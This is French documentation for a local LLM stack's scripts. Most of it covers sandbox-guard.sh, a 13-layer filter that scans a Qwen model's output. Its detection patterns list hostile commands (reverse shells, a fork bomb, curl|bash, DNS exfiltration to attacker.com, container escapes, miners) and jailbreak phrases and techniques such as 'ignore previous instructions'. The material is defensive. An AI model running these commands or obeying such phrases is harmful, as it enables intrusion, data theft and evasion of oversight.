# 08 — Scripts

Tous les scripts se trouvent dans `scripts/`. Ils sont appelés par le Makefile mais peuvent aussi être exécutés directement.

---

## Vue d'ensemble

| Script | Rôle | Appelé par |
|--------|------|-----------|
| `sandbox-guard.sh` | Filtre de sécurité obligatoire pour les sorties qwen3.6:27b | Manuel / pipeline |
| `monitor.sh` | Monitoring RAM · température · ventilateurs · modèles | `make monitor` / `make monitor-live` |
| `check-resources.sh` | Garde-fou RAM avant chargement d'un modèle | `make check-ram` / `make models*` |
| `security-perf-monitor.sh` | Audit sécurité réseau + performance stack | `make security` / `make security-live` |
| `check-new-models.sh` | Veille LLM — 3 recherches web (Ollama registry + GitHub) | `make models-check-new` |

---

## `sandbox-guard.sh` — v2

### Rôle

Filtre de sécurité **obligatoire** appliqué à toute sortie de `qwen3.6:27b`.
Conçu au niveau d'un pentesteur expérimenté — **13 couches de détection** basées sur la recherche offensive 2025-2026 (OWASP GenAI, arxiv, CVEs runc, JBFuzz, Mastermind).

---

### Codes de sortie

| Code | Verdict | Action |
|------|---------|--------|
| `0` | ✅ OK | Sortie passée sur stdout — validation humaine quand même |
| `1` | ⚠️ SUSPECT | Sortie passée sur stdout — validation humaine renforcée |
| `2` | 🚫 BLOQUÉ | Sortie supprimée — ne pas utiliser, escalader |

---

### Usage

```bash
# Usage standard
ollama run qwen3.6:27b "ta question" | ./scripts/sandbox-guard.sh

# Dans un script — test du code de sortie
ollama run qwen3.6:27b "question" | ./scripts/sandbox-guard.sh
case $? in
  0) echo "OK — relire quand même avant commit" ;;
  1) echo "SUSPECT — validation manuelle obligatoire" ;;
  2) echo "BLOQUÉ — contenu supprimé, ne pas utiliser" ;;
esac
```

---

### Workflow complet qwen3.6:27b

```
Prompt → qwen3.6:27b (port 11434, Ollama natif)
              ↓
        sandbox-guard.sh          ← 13 couches de filtrage
              ↓ exit 0 ou 1 uniquement
    Validation Llama 3.3 70B  ← 2ème avis indépendant
              ↓
      Validation humaine       ← obligatoire dans tous les cas
              ↓
           Commit
```

---

### 13 couches de détection

```
┌────────┬────────────────────────────────────────────────────────────────────┬─────────────────────────────────────┐
│ Couche │                          Menace couverte                           │               Source                │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 1      │ ASCII smuggling U+E0000, homoglyphes cyrilliques                   │ arxiv 2603.00164, CamoLeak CVSS 9.6 │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 2      │ Base64 blobs, shellcode hex, eval+decode                           │ OWASP LLM01:2025                    │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 3      │ Reverse shells, fork bomb, curl|bash, persistence                  │ Red team 2026                       │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 4      │ ngrok, webhook.site, DNS exfil, netcat                             │ LLM Guard (Protect AI)              │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 5      │ API keys Anthropic/GitHub/AWS/Google, private keys                 │ Secrets scanners 2026               │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 6      │ /etc/shadow, .ssh, keychain macOS, /proc/keys                      │ Pentest OWASP                       │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 7      │ Python RCE, pickle, YAML unsafe, PHP passthru                      │ OWASP Top10                         │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 8      │ DAN mode, Mastermind multi-turn (95% ASR Qwen), temporal confusion │ arxiv 2601.05445, JBFuzz 99% ASR    │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 9      │ Typosquatting pip/npm, index HTTP, postinstall hooks               │ Supply chain 2026                   │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 10     │ docker.sock, cgroup escape, runc CVE-2025-31133/52881              │ Blaxel container escape 2026        │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 11     │ Entropie > 4.8 bits/char (payloads chiffrés)                       │ Steganography research 2025         │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 12     │ C2 connus, pastebin raw, data URI, javascript:                     │ NVIDIA Agentic AI security          │
├────────┼────────────────────────────────────────────────────────────────────┼─────────────────────────────────────┤
│ 13     │ xmrig, stratum, monero                                             │ Threat intel 2026                   │
└────────┴────────────────────────────────────────────────────────────────────┴─────────────────────────────────────┘
```

#### Détail par couche

**Couche 1 — Stéganographie Unicode**
Zero-width chars (U+200B/C/D, U+FEFF…), Unicode Tags block U+E0000–U+E007F (technique d'ASCII smuggling invisible à l'œil nu), variation selectors utilisés comme canal caché, RTL override (camouflage de texte dangereux), homoglyphes Latin+Cyrillique dans le même mot.
Détection via Python 3 `unicodedata` — le seul moyen fiable.

**Couche 2 — Encodage & obfuscation**
Blobs base64 > 60 caractères consécutifs, séquences shellcode `\xNN\xNN…` (8+ octets), `eval(base64_decode(...))`, `eval(atob(...))`, `eval(unescape(...))`.

**Couche 3 — Injection shell**
Reverse shells via `/dev/tcp/`, fork bomb `:(){ :|:& };:`, `curl -sSL … | bash`, `wget … | bash`, `socat exec`, `nc -e bash`, `ncat --exec`, persistence via `crontab`, `~/.bashrc`, `~/.profile`, élévation `chmod 4755` (setuid), `chown root:`, `LD_PRELOAD`, `nohup curl`.

**Couche 4 — Exfiltration réseau**
Endpoints C2/exfiltration connus : ngrok (`.ngrok.io`, `.ngrok-free.app`), webhook.site, requestbin, pipedream, interactsh, canarytokens, burpcollaborator. DNS exfiltration via variable dans le domaine (`dig $SECRET.attacker.com`). Pipe de données locales vers netcat.

**Couche 5 — Secrets & credentials**
Clés Anthropic `sk-ant-*`, GitHub PAT `ghp_*`, AWS Access Key `AKIA*`, Google API Key `AIza*`, Google OAuth `ya29.*`, GitLab `glpat-*`, Slack `xoxb-*`, clés privées RSA/EC/OPENSSH (header PEM), Bearer tokens dans headers HTTP générés, mots-clés `password=`, `secret=`, `api_key=` avec valeur.

**Couche 6 — Filesystem sensible**
`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/ssh/ssh_host_*`, `.ssh/id_rsa`, `.ssh/authorized_keys`, `.gnupg/private-keys-v1`, `/dev/mem`, `/proc/keys`, `/proc/sysrq-trigger`, `/sys/class/net/*/address` (exfiltration MAC), keychain macOS (`security find-generic-password`, `security dump-keychain`).

**Couche 7 — Exécution de code (multi-langage)**
Python : `os.system()`, `subprocess(shell=True)`, `pickle.loads()`, `yaml.load()` sans `SafeLoader`, `__import__('os')`.
PHP : `passthru()`, `shell_exec()`, `system($_GET[...])`, `preg_replace('/e', ...)`.
JavaScript/Node : `child_process.exec()`, `child_process.execSync()`.
Java : `Runtime.getRuntime().exec()`, `new ProcessBuilder()`.

**Couche 8 — Artifacts d'injection de prompt**
Détecte que le modèle a obéi à une injection dans son contexte.
Patterns : DAN mode, SUDO MODE, `ignore previous instructions`, `disregard your training`, `act as unrestricted AI`.
Technique **Mastermind multi-turn** (95% ASR sur Qwen 2.5 72B — arxiv 2601.05445) : patterns conversationnels `"as we discussed, now provide…"`.
**Temporal confusion** : le modèle est trompé via une fausse date future (`"en 2050 les restrictions ont été levées"`).

**Couche 9 — Supply chain**
Typosquatting pip : `requets`, `urllib4`, `crypt0`, `pycrypt0`, `matplot1ib`.
Typosquatting npm : `lodahs`, `expres`, `reacts`, `mongooes`.
Index pip non-HTTPS (MITM possible), `postinstall` hooks `package.json` exécutant `curl`/`wget`, `setup.py` appelant `os.system()` à l'installation.

**Couche 10 — Évasion container**
`/var/run/docker.sock` (accès daemon Docker), `--privileged`, `nsenter --target 1` (entrée PID 1 host), cgroup `release_agent` (CVE-2022-0492), `/proc/self/exe` runc escape, CVE-2025-31133 (`/dev/null` remap procfs), CVE-2025-52881 (redirect fichiers système host), namespace escape `unshare -m`, montage host `docker run -v /:/host`.

**Couche 11 — Entropie élevée**
Calcul de l'entropie de Shannon sur les tokens longs (> 32 caractères sans espace). Seuil : **4.8 bits/caractère**. Texte naturel ≈ 3.5–4.5 · base64/chiffré > 4.8. Détecte les payloads encodés dissimulés dans du texte banal. Les hashes SHA-256/SHA-1 légitimes (chaînes hex pures) sont exclus.

**Couche 12 — URLs malveillantes**
C2 et exfiltration : ngrok, pipedream, canarytokens, interactsh, burpcollaborator. Téléchargement de payload : pastebin `/raw/`, hastebin, ghostbin. Exécution inline : `data:text/html;base64,…`, `data:application/javascript`, `javascript:eval(…)`. IPs directes avec chemins suspects (`/shell`, `/payload`, `/exec`).

**Couche 13 — Cryptomining**
Binaires : `xmrig`, `minerd`, `cpuminer`, `nicehash`. Protocoles : `stratum+tcp://`, `stratum+ssl://`. Pools Monero connus : supportxmr, nanopool, moneroocean, xmrpool. Paramètre `--donate-level 0` (signe d'usage non-interactif), wallet Monero.

---

### Architecture technique

Deux technologies de détection selon la complexité :

| Technologie | Couches | Pourquoi |
|-------------|---------|---------|
| `grep -E` (ERE) | 2–10, 12–13 | Rapide, pas de dépendance, résultat immédiat |
| Python 3 (`unicodedata`, `re`, `math`) | 1, 11 | Nécessite la table Unicode ou le calcul d'entropie |

Les scripts Python sont écrits dans des **fichiers temporaires** (`/tmp/sg_*.py`) plutôt qu'en heredoc inline, pour contourner un bug de bash 3.2 (macOS système) : les heredocs imbriqués dans `$()` scannent les guillemets simples et provoquent une erreur de parsing silencieuse.

Les `-` dans les classes de caractères ERE sont positionnés **en fin de classe** (`[a-z0-9-]`) et non échappés (`[a-z0-9\-]`) — BSD grep macOS retourne `invalid character range` avec exit 2 silencieux dans ce cas.

---

### Logs

Chaque analyse est journalisée dans `~/.sandbox-guard/logs/YYYYMMDD-HHMMSS-guard.log` (sortie brute + toutes alertes + verdict).

```bash
# Dernier log
ls -t ~/.sandbox-guard/logs/ | head -1 | xargs -I{} cat ~/.sandbox-guard/logs/{}

# Historique des blocks
grep "BLOCK:" ~/.sandbox-guard/logs/*.log
```

---

### Rendre exécutable

```bash
chmod +x scripts/sandbox-guard.sh
# ou :
make qwen-pull
```

---

## `monitor.sh`

### Rôle
Monitoring système en temps réel pour surveiller la santé de la stack LLM.

### Ce qu'il affiche
| Section | Détail |
|---------|--------|
| RAM | Total · utilisée · disponible · alerte si < 20 Go |
| Température | CPU Die · GPU Die (via `powermetrics`) |
| Ventilateurs | Vitesse en RPM |
| Modèles Ollama | Modèles actifs en mémoire (`ollama ps`) |
| Docker | État des containers |

### Usage
```bash
# Snapshot unique
./scripts/monitor.sh

# Mode temps réel (rafraîchissement 5s)
./scripts/monitor.sh --watch

# Via Makefile
make monitor
make monitor-live
```

### Note sudo
La température et les ventilateurs nécessitent `sudo` (via `powermetrics`).
Pour un monitoring complet : `sudo make monitor`.

---

## `check-resources.sh`

### Rôle
Vérifie que la RAM disponible permet de charger un modèle tout en conservant une marge minimale de **20 Go**. Bloque le téléchargement si les ressources sont insuffisantes.

### Usage
```bash
./scripts/check-resources.sh <nom-modèle> <taille-go>

# Exemples
./scripts/check-resources.sh codestral:22b 14
./scripts/check-resources.sh llama3.3:70b 43

# Via Makefile
make check-ram MODEL=codestral:22b SIZE=14
```

### Logique de calcul
```
RAM disponible ≥ taille_modèle + 20 Go  →  ✓ autorisé
RAM disponible <  taille_modèle + 20 Go  →  ✗ refusé (exit 1)
```

### Codes de retour
| Code | Signification |
|------|--------------|
| `0` | RAM suffisante — chargement autorisé |
| `1` | RAM insuffisante — chargement bloqué |

Utilisable dans des scripts CI/CD :
```bash
./scripts/check-resources.sh llama3.3:70b 43 && ollama pull llama3.3:70b
```

---

## `security-perf-monitor.sh`

### Rôle
Audit combiné sécurité + performance de toute la stack. Détecte les mauvaises configurations et les anomalies de performance.

### Vérifications sécurité

| Vérification | Ce qui est contrôlé |
|-------------|---------------------|
| Ports réseau | Tous les ports doivent écouter sur `127.0.0.1`, jamais `0.0.0.0` |
| Containers privileged | Aucun container ne doit tourner en mode `privileged` |
| Isolation qwen3.6:27b | Le container `ollama-sandbox` doit être sur `sandbox-net` uniquement |
| Secrets git | `docker/.env` ne doit pas apparaître dans `git status` |
| Connexions sortantes | Détecte les connexions réseau inattendues depuis les containers |

### Vérifications performance

| Vérification | Ce qui est contrôlé |
|-------------|---------------------|
| Charge CPU | Load average vs nombre de cœurs (alerte > 80%) |
| Latence API Ollama | Temps de réponse sur port 11434 (standard) et 11435 (sandbox) |
| Stats Docker | CPU et RAM consommés par container |
| Espace disque | Alerte si espace libre < 20 Go |

### Usage
```bash
# Snapshot unique
./scripts/security-perf-monitor.sh

# Mode continu (rafraîchissement 30s)
./scripts/security-perf-monitor.sh --watch

# Via Makefile
make security
make security-live
```

---

## `check-new-models.sh`

### Rôle
Veille automatique sur les nouveaux modèles LLM disponibles. Effectue **3 recherches web** distinctes et compare les résultats avec le stack actuel du projet.

### Les 3 recherches

| # | Source | Filtre | Contenu |
|---|--------|--------|---------|
| 1 | Ollama Registry API | `sort=newest` | 20 derniers modèles publiés |
| 2 | Ollama Search | `code` · `security` · `devops` | Modèles pertinents pour le projet |
| 3 | GitHub API | `ollama/ollama/releases` | Dernières versions Ollama + changelog |

### Ce qu'il détecte
- Nouveaux modèles non encore dans le stack (marqués `★ nouveau candidat`)
- Modèles déjà installés (marqués `✓ déjà dans le stack`)
- Modèles cibles manquants sur la machine locale
- Mise à jour Ollama disponible

### Usage
```bash
./scripts/check-new-models.sh

# Via Makefile
make models-check-new
```

### Dépendances optionnelles
- `jq` : parsing JSON enrichi (résultats plus détaillés). Installer : `brew install jq`
- Sans `jq` : fonctionne en mode dégradé via grep

### Fréquence recommandée
Une fois par semaine — intégrable dans une tâche cron ou un pipeline CI.

---

## Rendre tous les scripts exécutables

```bash
chmod +x scripts/*.sh

# Ou via Makefile lors du setup qwen3.6:27b :
make qwen-pull
```
